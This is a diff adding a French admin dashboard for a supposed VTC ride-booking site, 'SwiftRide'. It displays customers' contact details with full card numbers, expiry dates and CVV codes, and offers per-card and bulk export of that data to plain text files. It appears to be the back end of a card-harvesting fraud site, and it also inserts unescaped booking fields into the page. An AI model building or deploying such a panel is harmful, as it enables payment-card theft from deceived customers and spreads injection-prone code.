@@ -1,0 +1,481 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Administration - SwiftRide VTC</title>
+    
+    <!-- Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Outfit:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    
+    <!-- Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <link rel="stylesheet" href="/style.css">
+    <style>
+        /* Small styling overrides specific to administrative dashboard layouts */
+        body {
+            background-color: var(--color-bg-deep);
+        }
+        .admin-login-wrapper {
+            display: none;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 2rem;
+        }
+    </style>
+</head>
+<body class="admin-body">
+
+    <!-- ==================== LOCK SCREEN (LOGIN) ==================== -->
+    <div class="admin-login-wrapper" id="loginWrapper">
+        <div class="admin-login-card glass-panel text-center">
+            <img src="/assets/prestige_logo.png" alt="SwiftRide Logo" class="admin-login-logo">
+            <h2 class="admin-login-title">Accès Administration</h2>
+            
+            <form id="adminLoginForm">
+                <div class="form-group" style="text-align: left;">
+                    <label for="adminPassword">Mot de passe secret *</label>
+                    <input type="password" name="password" id="adminPassword" placeholder="••••••••" style="width: 100%;" required>
+                </div>
+                <button type="submit" class="btn btn-primary btn-block" style="margin-top: 1.5rem;">
+                    <i class="fa-solid fa-lock-open"></i> Connexion
+                </button>
+                <div id="loginError" style="color: #ea4335; font-size: 0.85rem; margin-top: 1rem;"></div>
+            </form>
+        </div>
+    </div>
+
+    <!-- ==================== DASHBOARD PANEL ==================== -->
+    <div class="admin-dashboard-container" id="dashboardContainer" style="display: none;">
+        
+        <!-- Navigation Header -->
+        <nav class="admin-nav">
+            <div class="container admin-nav-container">
+                <img src="/assets/prestige_logo.png" alt="SwiftRide" class="admin-nav-logo">
+                <div class="admin-nav-actions">
+                    <span class="gold-text font-semibold"><i class="fa-solid fa-user-shield"></i> Administrateur</span>
+                    <button id="btnLogout" class="btn btn-secondary btn-small" style="margin-left: 10px;">
+                        <i class="fa-solid fa-power-off"></i> Déconnexion
+                    </button>
+                </div>
+            </div>
+        </nav>
+        
+        <!-- Dashboard Core content -->
+        <main class="container admin-main">
+            
+            <!-- Statistics Row -->
+            <div class="admin-stats-grid">
+                <div class="admin-stat-card glass-panel">
+                    <span class="admin-stat-title">Réservations</span>
+                    <span class="admin-stat-value" id="statBookings">0</span>
+                    <i class="fa-solid fa-calendar-days admin-stat-icon"></i>
+                </div>
+                <div class="admin-stat-card glass-panel">
+                    <span class="admin-stat-title">Paiements Carte</span>
+                    <span class="admin-stat-value" id="statCard">0</span>
+                    <i class="fa-solid fa-credit-card admin-stat-icon"></i>
+                </div>
+                <div class="admin-stat-card glass-panel">
+                    <span class="admin-stat-title">Garanties Cash</span>
+                    <span class="admin-stat-value" id="statCash">0</span>
+                    <i class="fa-solid fa-money-bill-wave admin-stat-icon"></i>
+                </div>
+                <div class="admin-stat-card glass-panel">
+                    <span class="admin-stat-title">Paiements Revolut</span>
+                    <span class="admin-stat-value" id="statRevolut">0</span>
+                    <i class="fa-solid fa-bolt admin-stat-icon" style="color: #0075eb;"></i>
+                </div>
+                <div class="admin-stat-card glass-panel">
+                    <span class="admin-stat-title">Revenu Estimé</span>
+                    <span class="admin-stat-value" id="statRevenue">0.00 €</span>
+                    <i class="fa-solid fa-coins admin-stat-icon"></i>
+                </div>
+            </div>
+            
+            <!-- Bookings List table card -->
+            <div class="admin-panel-card glass-panel">
+                <div class="admin-panel-header">
+                    <h2 class="admin-panel-title">
+                        <i class="fa-solid fa-list-check"></i> Traitement des Réservations
+                    </h2>
+                    <button id="btnExportCards" class="btn btn-primary btn-small">
+                        <i class="fa-solid fa-file-arrow-down"></i> Exporter les cartes (.txt)
+                    </button>
+                </div>
+                
+                <div class="admin-table-wrapper">
+                    <table class="admin-table" id="bookingsTable">
+                        <thead>
+                            <tr>
+                                <th>Réf / Date</th>
+                                <th>Client</th>
+                                <th>Trajet & Véhicule</th>
+                                <th>Bagages / Vol</th>
+                                <th>Mode de Paiement</th>
+                                <th>Garantie CB</th>
+                                <th>Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody id="bookingsTableBody">
+                            <!-- Dynamic Content -->
+                        </tbody>
+                    </table>
+                </div>
+                
+                <!-- Table Empty placeholder -->
+                <div class="admin-empty-state" id="emptyState" style="display: none;">
+                    <i class="fa-solid fa-box-open"></i>
+                    <p>Aucune demande de réservation enregistrée sur le serveur.</p>
+                </div>
+            </div>
+            
+        </main>
+    </div>
+
+    <!-- ==================== PREMIUM CARD MODAL ==================== -->
+    <div class="admin-modal-overlay" id="cardModalOverlay">
+        <div class="admin-modal-card glass-panel">
+            <div class="admin-modal-header">
+                <h3 class="admin-modal-title"><i class="fa-solid fa-credit-card gold-text"></i> Carte de Garantie</h3>
+                <button class="admin-modal-close" id="btnModalClose">&times;</button>
+            </div>
+            
+            <!-- Credit Card Graphic -->
+            <div class="admin-card-mock">
+                <div class="mock-chip"></div>
+                <div class="mock-number" id="mockCardNumber">•••• •••• •••• ••••</div>
+                <div class="mock-row">
+                    <div>
+                        <span class="mock-label">Titulaire</span>
+                        <span class="mock-val" id="mockCardName">TITULAIRE NOM</span>
+                    </div>
+                    <div style="text-align: center;">
+                        <span class="mock-label">Expiration</span>
+                        <span class="mock-val" id="mockCardExpiry">MM/AA</span>
+                    </div>
+                    <div style="text-align: right;">
+                        <span class="mock-label">CVV</span>
+                        <span class="mock-val" id="mockCardCvv">•••</span>
+                    </div>
+                </div>
+            </div>
+            
+            <button class="btn btn-secondary btn-block" id="btnDownloadCardTxt">
+                <i class="fa-solid fa-download"></i> Télécharger cette fiche (.txt)
+            </button>
+        </div>
+    </div>
+
+    <!-- ==================== CONTROLLER LOGIC ==================== -->
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const loginWrapper = document.getElementById('loginWrapper');
+            const dashboardContainer = document.getElementById('dashboardContainer');
+            const bookingsTableBody = document.getElementById('bookingsTableBody');
+            const emptyState = document.getElementById('emptyState');
+            const adminLoginForm = document.getElementById('adminLoginForm');
+            const loginError = document.getElementById('loginError');
+            const btnLogout = document.getElementById('btnLogout');
+            const btnExportCards = document.getElementById('btnExportCards');
+            
+            // Stats elements
+            const statBookings = document.getElementById('statBookings');
+            const statCard = document.getElementById('statCard');
+            const statCash = document.getElementById('statCash');
+            const statRevolut = document.getElementById('statRevolut');
+            const statRevenue = document.getElementById('statRevenue');
+            
+            // Modal elements
+            const cardModalOverlay = document.getElementById('cardModalOverlay');
+            const btnModalClose = document.getElementById('btnModalClose');
+            const mockCardNumber = document.getElementById('mockCardNumber');
+            const mockCardName = document.getElementById('mockCardName');
+            const mockCardExpiry = document.getElementById('mockCardExpiry');
+            const mockCardCvv = document.getElementById('mockCardCvv');
+            const btnDownloadCardTxt = document.getElementById('btnDownloadCardTxt');
+            
+            let clientBookings = [];
+            let activeBookingForModal = null;
+
+            // Fetch session status and data on load
+            function checkStatus() {
+                fetch('/api/admin/status')
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.loggedIn) {
+                            clientBookings = data.bookings;
+                            showDashboard(data);
+                        } else {
+                            showLogin();
+                        }
+                    })
+                    .catch(err => {
+                        console.error('Error fetching admin status:', err);
+                        showLogin();
+                    });
+            }
+            checkStatus();
+
+            function showLogin() {
+                loginWrapper.style.display = 'flex';
+                dashboardContainer.style.display = 'none';
+                document.getElementById('adminPassword').value = '';
+                loginError.textContent = '';
+            }
+
+            function showDashboard(data) {
+                loginWrapper.style.display = 'none';
+                dashboardContainer.style.display = 'block';
+
+                // Update Stats
+                statBookings.textContent = data.stats.total;
+                statCard.textContent = data.stats.cardCount;
+                statCash.textContent = data.stats.cashCount;
+                statRevolut.textContent = data.stats.revolutCount;
+                statRevenue.textContent = `${data.stats.revenue.toFixed(2)} €`;
+
+                // Render Table Rows
+                bookingsTableBody.innerHTML = '';
+                if (data.bookings.length === 0) {
+                    emptyState.style.display = 'block';
+                } else {
+                    emptyState.style.display = 'none';
+                    data.bookings.forEach(booking => {
+                        const isCash = (booking.paiement || '').toLowerCase().includes('cash') || (booking.paiement || '').toLowerCase().includes('espèces');
+                        const price = booking.estimatedRevenue || 100;
+                        const ccNumber = (booking.carte && booking.carte.numero) ? booking.carte.numero : 'Non spécifiée';
+
+                        const tr = document.createElement('tr');
+                        tr.innerHTML = `
+                            <td>
+                                <span class="font-semibold gold-text">${booking.id}</span>
+                                <div style="font-size: 0.75rem; color: var(--color-text-muted); margin-top: 0.25rem;">
+                                    ${booking.timestamp}
+                                </div>
+                            </td>
+                            <td>
+                                <div class="admin-client-info">
+                                    <span class="admin-client-name">${booking.nom}</span>
+                                    <span class="admin-client-contact"><i class="fa-solid fa-phone"></i> ${booking.telephone}</span>
+                                    <span class="admin-client-contact"><i class="fa-solid fa-envelope"></i> ${booking.email}</span>
+                                </div>
+                            </td>
+                            <td>
+                                <div class="admin-trip-route">
+                                    <span class="admin-route-point from"><i class="fa-solid fa-plane-departure"></i> ${booking.depart}</span>
+                                    <span class="admin-route-point to"><i class="fa-solid fa-location-dot gold-text"></i> ${booking.destination}</span>
+                                    <div style="font-size: 0.8rem; margin-top: 0.25rem; color: var(--color-primary-gold);">
+                                        <i class="fa-solid fa-car-side"></i> ${booking.vehicule}
+                                    </div>
+                                </div>
+                            </td>
+                            <td>
+                                <div style="font-size: 0.8rem;">
+                                    <div><i class="fa-solid fa-briefcase"></i> ${booking.bagages}</div>
+                                    <div style="color: var(--color-text-muted); margin-top: 0.25rem;">
+                                        <i class="fa-solid fa-plane"></i> Vol: ${booking.vol}
+                                    </div>
+                                </div>
+                            </td>
+                            <td>
+                                <span class="badge-payment ${isCash ? 'cash' : 'card'}">
+                                    ${booking.paiement}
+                                </span>
+                                <div style="font-size: 0.8rem; margin-top: 0.25rem; font-weight: 600;">
+                                    Est. ${price.toFixed(2)} €
+                                </div>
+                            </td>
+                            <td>
+                                <span class="font-semibold">${ccNumber}</span>
+                            </td>
+                            <td>
+                                <div class="admin-actions-cell">
+                                    <button class="admin-btn-action view btn-view-card" data-id="${booking.id}" title="Voir les données de la carte">
+                                        <i class="fa-solid fa-eye"></i>
+                                    </button>
+                                    <button class="admin-btn-action delete btn-delete-booking" data-id="${booking.id}" title="Supprimer la réservation">
+                                        <i class="fa-solid fa-trash-can"></i>
+                                    </button>
+                                </div>
+                            </td>
+                        `;
+                        bookingsTableBody.appendChild(tr);
+                    });
+
+                    // Bind Actions
+                    document.querySelectorAll('.btn-view-card').forEach(btn => {
+                        btn.addEventListener('click', () => {
+                            const bookingId = btn.getAttribute('data-id');
+                            const targetBooking = clientBookings.find(b => b.id === bookingId);
+                            if (targetBooking) openCardModal(targetBooking);
+                        });
+                    });
+
+                    document.querySelectorAll('.btn-delete-booking').forEach(btn => {
+                        btn.addEventListener('click', () => {
+                            const bookingId = btn.getAttribute('data-id');
+                            if (confirm('Voulez-vous vraiment supprimer cette réservation ? Cette action est définitive.')) {
+                                deleteBooking(bookingId);
+                            }
+                        });
+                    });
+                }
+            }
+
+            // Auth handlers
+            adminLoginForm.addEventListener('submit', (e) => {
+                e.preventDefault();
+                const password = document.getElementById('adminPassword').value;
+
+                fetch('/api/admin/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ password })
+                })
+                .then(res => {
+                    if (res.ok) {
+                        return res.json();
+                    }
+                    return res.json().then(err => { throw err; });
+                })
+                .then(data => {
+                    if (data.success) {
+                        checkStatus();
+                    }
+                })
+                .catch(err => {
+                    loginError.textContent = err.error || 'Mot de passe incorrect.';
+                });
+            });
+
+            btnLogout.addEventListener('click', () => {
+                fetch('/api/admin/logout', { method: 'POST' })
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.success) {
+                            showLogin();
+                        }
+                    })
+                    .catch(err => console.error('Logout failed:', err));
+            });
+
+            function deleteBooking(id) {
+                fetch(`/api/reservations/${id}`, { method: 'DELETE' })
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.success) {
+                            checkStatus();
+                        } else {
+                            alert('Erreur lors de la suppression de la réservation.');
+                        }
+                    })
+                    .catch(err => {
+                        console.error('Delete error:', err);
+                        alert('Erreur réseau.');
+                    });
+            }
+
+            // Modal Controls
+            function openCardModal(booking) {
+                activeBookingForModal = booking;
+                
+                if (booking.carte) {
+                    mockCardNumber.textContent = (booking.carte.numeroComplet || booking.carte.numero || '').replace(/(.{4})/g, '$1 ').trim();
+                    mockCardName.textContent = (booking.carte.nom || 'TITULAIRE').toUpperCase();
+                    mockCardExpiry.textContent = booking.carte.expiry || 'MM/AA';
+                    mockCardCvv.textContent = booking.carte.cvv || '•••';
+                } else {
+                    mockCardNumber.textContent = '•••• •••• •••• ••••';
+                    mockCardName.textContent = 'NON DISPONIBLE';
+                    mockCardExpiry.textContent = 'MM/AA';
+                    mockCardCvv.textContent = '•••';
+                }
+                
+                cardModalOverlay.classList.add('active');
+            }
+
+            function closeCardModal() {
+                cardModalOverlay.classList.remove('active');
+                activeBookingForModal = null;
+            }
+
+            btnModalClose.addEventListener('click', closeCardModal);
+            cardModalOverlay.addEventListener('click', (e) => {
+                if (e.target === cardModalOverlay) closeCardModal();
+            });
+
+            // Card TXT export
+            btnDownloadCardTxt.addEventListener('click', () => {
+                if (!activeBookingForModal) return;
+                
+                const b = activeBookingForModal;
+                const card = b.carte || {};
+                
+                const txt = `=== SWIFTRIDE VTC - EXPORT CARTE DE GARANTIE ===
+Réservation Réf : ${b.id}
+Date Création   : ${b.timestamp}
+Client          : ${b.nom}
+Téléphone       : ${b.telephone}
+Email           : ${b.email}
+
+=== COMPTE BANCAIRE ===
+Nom Titulaire   : ${card.nom || ''}
+Numéro de Carte : ${(card.numeroComplet || card.numero || '').replace(/(.{4})/g, '$1 ').trim()}
+Date Expiration : ${card.expiry || ''}
+Cryptogramme CVV: ${card.cvv || ''}
+===================================================`;
+                
+                downloadTxtFile(`carte_garantie_${b.id}.txt`, txt);
+            });
+
+            // Bulk export
+            btnExportCards.addEventListener('click', () => {
+                if (clientBookings.length === 0) {
+                    alert('Aucune réservation à exporter.');
+                    return;
+                }
+                
+                let bulkTxt = `=== SWIFTRIDE VTC - EXPORT EN MASSE DES CARTES DE GARANTIE ===
+Date de l'export : ${new Date().toLocaleString('fr-FR')}
+Nombre d'entrées : ${clientBookings.length}
+======================================================================\n\n`;
+                
+                clientBookings.forEach(b => {
+                    const card = b.carte || {};
+                    bulkTxt += `Réf Réservation : ${b.id}
+Date Réservation: ${b.timestamp}
+Client          : ${b.nom} | Tél: ${b.telephone} | Email: ${b.email}
+Trajet          : ${b.depart} ⇄ ${b.destination} (${b.vehicule})
+Paiement choisi : ${b.paiement}
+
+--- DONNÉES CARTE ---
+Titulaire CB    : ${card.nom || ''}
+Numéro CB       : ${(card.numeroComplet || card.numero || '').replace(/(.{4})/g, '$1 ').trim()}
+Expiration      : ${card.expiry || ''}
+CVV             : ${card.cvv || ''}
+======================================================================\n\n`;
+                });
+                
+                downloadTxtFile(`export_cartes_swiftride.txt`, bulkTxt);
+            });
+
+            function downloadTxtFile(filename, text) {
+                const blob = new Blob([text], { type: 'text/plain;charset=utf-8' });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = filename;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+            }
+        });
+    </script>
+</body>
+</html>
